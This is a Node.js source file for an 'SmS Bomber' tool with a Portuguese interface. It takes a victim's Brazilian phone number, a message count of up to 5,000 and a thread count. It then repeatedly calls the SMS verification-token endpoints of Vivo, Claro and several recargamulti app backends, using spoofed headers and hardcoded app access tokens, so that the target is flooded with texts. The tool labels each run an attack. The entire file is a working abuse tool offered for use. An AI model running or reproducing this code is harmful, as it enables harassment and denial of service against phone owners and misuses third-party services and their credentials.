const cliProgress = require('cli-progress');
const readLine = require('readline-sync');
const tools = require('./tools');
const color = require('colors');
var figlet = require('figlet');
var crypto = require('crypto');
const spam = {}

spam.enviados = 0;

const b1 = new cliProgress.SingleBar({
	format: color.brightGreen('{bar}' + ' | {percentage}% » Enviados: {enviados}'),
	barCompleteChar: '\u2588',
	barIncompleteChar: '\u2591',
	hideCursor: true
});

color.setTheme({
  silly: 'rainbow',
  yellow: 'yellow',
  success: ['brightGreen', 'bold'],
  help: ['brightCyan', 'bold'],
  warn: ['brightYellow', 'bold'],
  info: ['brightBlue', 'bold'],
  error: ['brightRed', 'bold']
});

function startBypass(numero, quantidade, limite, threads, threadslimite) {
	if (isNaN(numero)) {
		process.exit(console.log('Ops! Numero errado.'.error));
	}
	if (numero.length != 11) {
		process.exit(console.log('Ops! Numero invalido.'.error));
	}
	if (isNaN(quantidade)) {
		process.exit(console.log('Ops! Quantia invalida.'.error));
	}
	if (quantidade > limite) {
		process.exit(console.log('Ops! Quantia invalida, limite (%s).'.error, limite));
	}
	if (threads > threadslimite) {
		process.exit(console.log('Ops! Quantia de threads invalida, limite (%s).'.error, threadslimite));
	}
	if (threads > 1) {
		console.log('\nObs: Uso de threads pode afetar a quantidade de sms (enviando mais rapidamente).'.error);
	}
}

async function op1(numero, quantidade) {
	
	var vivo = await tools.curl('https://login.vivo.com.br/mobile/br/com/vivo/mobile/portlets/loginmobile/sendTokenRequest.do', 'numero='+numero, {
		'Host': 'login.vivo.com.br',
		'Connection': 'keep-alive',
		'Accept': '*/*',
		'X-Requested-With': 'XMLHttpRequest',
		'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36',
		'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'Origin': 'https://login.vivo.com.br',
		'Sec-Fetch-Site': 'same-origin',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Dest': 'empty',
		'Referer': 'https://login.vivo.com.br/mobile/appmanager/env/publico'
		}, 'POST').then((res) => {
			var response = JSON.parse(res.body);
			if (response["code"] == 0) {
				
				if (spam.enviados == 0) {
					b1.start(quantidade, 0, {
						enviados: spam.enviados
					});
				}
				
				spam.enviados++
				spam.status = 1
				b1.update(spam.enviados, {
					enviados: spam.enviados
				});
			} else if (response["code"] == 101) {
				console.clear();
				process.exit(console.log('Erro » O numero %s nao corresponde a operadora Vivo | #ITZ - S3ps'.error, numero));
			} else if (response["code"] == 106) {
				console.clear();
				process.exit(console.log('Erro » Cliente com uma linha desativada | #ITZ - S3ps'.error));
			} else if (response["code"] == 109) {
				console.clear();
				process.exit(console.log('Erro » Cliente com uma linha cancelada | #ITZ - S3ps'.error));
			} else {
				console.clear();
				process.exit(console.log('Erro » Ocorreu um erro desconhecido (%s) | #ITZ - S3ps'.error, response["code"]));
			}
	});
	
	if (quantidade == spam.enviados) {
		b1.start(quantidade, quantidade, {
			enviados: spam.enviados
		});
		process.exit(console.log('\n\nAtaque finalizado! | #ITZ - S3ps\nhttp://itz.s3ps.ga'.help));
	} else {
		op1(numero, quantidade);
	}
	
}

async function op2(numero, quantidade) {
	
	var claro = await tools.curl('https://claro-recarga-api.m4u.com.br/sms-tokens/', `{"msisdn":"${numero}","target":"token","origin":"login"}`, {
		'Host': 'claro-recarga-api.m4u.com.br',
		'Connection': 'keep-alive',
		'Accept': 'application/json, text/plain, */*',
		'Channel': 'CLARO_WEB_DESKTOP',
		'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36',
		'Content-Type': 'application/json',
		'Origin': 'https://clarorecarga.claro.com.br',
		'Sec-Fetch-Site': 'cross-site',
		'Sec-Fetch-Mode': 'cors',
		'Sec-Fetch-Dest': 'empty',
		'Referer': 'https://clarorecarga.claro.com.br/recarga/login'
		}, 'POST').then((res) => {
			if (res.statusCode == 204) {
				
				if (spam.enviados == 0) {
					b1.start(quantidade, 0, {
						enviados: spam.enviados
					});
				}
				
				spam.enviados++
				spam.status = 1
				b1.update(spam.enviados, {
					enviados: spam.enviados
				});
			} else {
				console.clear();
				process.exit(console.log('Erro » Ocorreu um erro desconhecido | #ITZ - S3ps'.error));
			}
	});

	if (quantidade == spam.enviados) {
		b1.start(quantidade, quantidade, {
			enviados: spam.enviados
		});
		process.exit(console.log('\n\nAtaque finalizado! | #ITZ - S3ps\nhttp://itz.s3ps.ga'.help));
	} else {
		op2(numero, quantidade);
	}
	
}

async function op3(numero, quantidade) {
	
	var recargamulti = await tools.curl('https://cce-app.recargamulti.com.br/apirecarga/services/sms/generateToken/', `{"msisdn":"55${numero}"}`, {
		'Accept': 'application/json',
		'X-MIP-APP-VERSION': '4.2.0',
		'X-MIP-CHANNEL': 'CCEANDROID',
		'X-MIP-ACCESS-TOKEN': '728D6030-35A9-CCCE-AD19-A773CE0E4769',
		'Content-Type': 'application/json; charset=UTF-8',
		'Content-Length': '26',
		'Host': 'cce-app.recargamulti.com.br',
		'Connection': 'Keep-Alive',
		'User-Agent': 'okhttp/3.10.0'
		}, 'POST').then((res) => {
			var response = JSON.parse(res.body);
			if (response["success"]) {
				
				if (spam.enviados == 0) {
					b1.start(quantidade, 0, {
						enviados: spam.enviados
					});
				}
				
				spam.enviados++
				spam.status = 1
				b1.update(spam.enviados, {
					enviados: spam.enviados
				});
			} else if (response["error"]["code"] == 400 || response["error"]["code"] == 0) {
			} else {
				console.clear();
				process.exit(console.log('Erro » Ocorreu um error desconhecido | #ITZ - S3ps'.error));
			}
	});
	
	tools.sleep(2000);
	var recargamulti2 = await tools.curl('https://brightstar-app.recargamulti.com.br/apirecarga/services/sms/generateToken/', `{"msisdn":"55${numero}"}`, {
		'Accept': 'application/json',
		'X-MIP-APP-VERSION': '4.2.0',
		'X-MIP-CHANNEL': 'BRIGHTSTARANDROID',
		'X-MIP-ACCESS-TOKEN': 'F917BC34-BB7C-4308-BAEB-62E72DB5EE42',
		'Content-Type': 'application/json; charset=UTF-8',
		'Content-Length': '26',
		'Host': 'brightstar-app.recargamulti.com.br',
		'Connection': 'Keep-Alive',
		'User-Agent': 'okhttp/3.10.0'
		}, 'POST').then((res) => {
			var response = JSON.parse(res.body);
			if (response["success"]) {
				
				spam.enviados++
				spam.status = 1
				b1.update(spam.enviados, {
					enviados: spam.enviados
				});
			} else if (response["error"]["code"] == 400 || response["error"]["code"] == 0) {
			} else {
				console.clear();
				process.exit(console.log('Erro » Ocorreu um erro desconhecido | #ITZ - S3ps'.error));
			}
	});
	
	tools.sleep(2000);
	var recargamulti3 = await tools.curl('https://multirecarga-app.recargamulti.com.br/apirecarga/services/sms/generateToken/', `{"msisdn":"55${numero}"}`, {
		'Accept': 'application/json',
		'X-MIP-APP-VERSION': '4.2.1',
		'X-MIP-CHANNEL': 'MULTIRECARGAANDROID',
		'X-MIP-ACCESS-TOKEN': '385D5040-8414-11E5-A837-0800200C9A66',
		'Content-Type': 'application/json; charset=UTF-8',
		'Content-Length': '26',
		'Host': 'multirecarga-app.recargamulti.com.br',
		'Connection': 'Keep-Alive',
		'User-Agent': 'okhttp/3.10.0'
		}, 'POST').then((res) => {
			var response = JSON.parse(res.body);
			if (response["success"]) {
				
				spam.enviados++
				spam.status = 1
				b1.update(spam.enviados, {
					enviados: spam.enviados
				});
			} else if (response["error"]["code"] == 400 || response["error"]["code"] == 0) {
			} else {
				console.clear();
				process.exit(console.log('Erro » Ocorreu um erro desconhecido | #ITZ - S3ps'.error));
			}
	});
	
	tools.sleep(2000);
	var recargamulti4 = await tools.curl('https://alcatel-app.recargamulti.com.br/apirecarga/services/sms/generateToken/', `{"msisdn":"55${numero}"}`, {
		'Accept': 'application/json',
		'X-MIP-APP-VERSION': '4.2.0',
		'X-MIP-CHANNEL': 'ALCATELANDROID',
		'X-MIP-ACCESS-TOKEN': '242D4F54-0D61-41F2-998F-EF4D57AAA060',
		'Content-Type': 'application/json; charset=UTF-8',
		'Content-Length': '26',
		'Host': 'alcatel-app.recargamulti.com.br',
		'Connection': 'Keep-Alive',
		'User-Agent': 'okhttp/3.10.0'
		}, 'POST').then((res) => {
			var response = JSON.parse(res.body);
			if (response["success"]) {
				
				spam.enviados++
				spam.status = 1
				b1.update(spam.enviados, {
					enviados: spam.enviados
				});
			} else if (response["error"]["code"] == 400 || response["error"]["code"] == 0) {
			} else {
				console.clear();
				process.exit(console.log('Erro » Ocorreu um erro desconhecido | #ITZ - S3ps'.error));
			}
	});
	tools.sleep(2000);
	var recargamulti6 = await tools.curl('https://samsung-app.recargamulti.com.br/apirecarga/services/sms/generateToken/', `{"msisdn":"55${numero}"}`, {
		'Accept': 'application/json',
		'X-MIP-APP-VERSION': '4.2.0',
		'X-MIP-CHANNEL': 'ALCATELANDROID',
		'X-MIP-ACCESS-TOKEN': '2A5DE230-3DAB-4E65-A65B-70CC698D5DEB',
		'Content-Type': 'application/json; charset=UTF-8',
		'Content-Length': '26',
		'Host': 'samsung-app.recargamulti.com.br',
		'Connection': 'Keep-Alive',
		'User-Agent': 'okhttp/3.10.0'
		}, 'POST').then((res) => {
			var response = JSON.parse(res.body);
			if (response["success"]) {
				
				spam.enviados++
				spam.status = 1
				b1.update(spam.enviados, {
					enviados: spam.enviados
				});
			} else if (response["error"]["code"] == 400 || response["error"]["code"] == 0) {
			} else {
				console.clear();
				process.exit(console.log('Erro » Ocorreu um erro desconhecido | #ITZ - S3ps'.error));
			}
	});
	if (quantidade == spam.enviados) {
		b1.start(quantidade, quantidade, {
			enviados: spam.enviados
		});
		process.exit(console.log('\n\nAtaque finalizado! | #ITZ - S3ps\nhttp://itz.s3ps.ga'.help));
	} else {
		op3(numero, quantidade);
	}
	
}
function options() {
	console.clear();
	console.log(figlet.textSync('SmS Bomber', {
	    font: 'Standard',
	    horizontalLayout: 'default',
	    verticalLayout: 'default',
	    width: 100,
	    whitespaceBreak: true
	}));
	console.log(figlet.textSync('by S3ps', {
	    font: 'Mini',
	    horizontalLayout: 'default',
	    verticalLayout: 'default',
	    width: 80,
	    whitespaceBreak: true
	}));
	
	console.log('1 | Vivo (Max: 5000)'.brightGreen);
	console.log('2 | Claro (Max: 5000'.brightGreen);
	console.log('3 | Recarga (Max: 5000)'.brightGreen);
	console.log('0 | Sair\n'.brightRed);
	console.log('\nhttp://itz.s3ps.ga');
	return readLine.question('Escolha uma opcao: ');
}

spam.option = options();

if (spam.option == 1) {
	
	console.log('Selecionado (Vivo)\n'.success);
	var numero = readLine.question('Alvo (Ex: 219xxxxxxxx): ').replace(/[-/(/) \ ]/gmsi, '').replace('+55', '');
	var quantidade = readLine.question('SmS (Max: 5000): ');
	var threads = readLine.question('Threads (Max 15): ');
	startBypass(numero, quantidade, 5000, threads, 15);
	
	console.log("\nIniciado | Quantia %s SMS | Alvo 55%s | Threads %s | Tipo Vivo\n".help, quantidade, numero, threads);
	
	for (var i = 0; i < threads; i++) {
		op1(numero, quantidade);
	}

} else if (spam.option == 2) {
	
	console.log('Selecionado (Claro)\n'.success);
	var numero = readLine.question('Alvo (Ex: 219xxxxxxxx): ').replace(/[-/(/) \ ]/gmsi, '').replace('+55', '');
	var quantidade = readLine.question('SmS (Max: 5000): ');
	var threads = readLine.question('Threads (Max 15): ');
	startBypass(numero, quantidade, 5000, threads, 15);
	
	console.log("\nIniciado | Quantia %s SMS | Alvo 55%s | Threads %s | Tipo Claro\n".help, quantidade, numero, threads);
	
	for (var i = 0; i < threads; i++) {
		op2(numero, quantidade);
	}
	
} else if (spam.option == 3) {
	
	console.log('Selecionado (Recarga)\n'.success);
	var numero = readLine.question('Alvo (Ex: 219xxxxxxxx): ').replace(/[-/(/) \ ]/gmsi, '').replace('+55', '');
	var quantidade = readLine.question('SmS (Max: 5000): ');
	var threads = readLine.question('Threads (Max 15): ');
	startBypass(numero, quantidade, 5000, threads, 15);
	
	console.log("\nIniciado | Quantia %s SMS | Alvo 55%s | Threads %s | Tipo Recarga\n".help, quantidade, numero, threads);
	
	for (var i = 0; i < threads; i++) {
		op3(numero, quantidade);
	}
	
} else if (spam.option == 0) {
	process.exit(console.log('Saindo.'));
} else {
	console.log("Ops! Opcao invalida.".error);
}
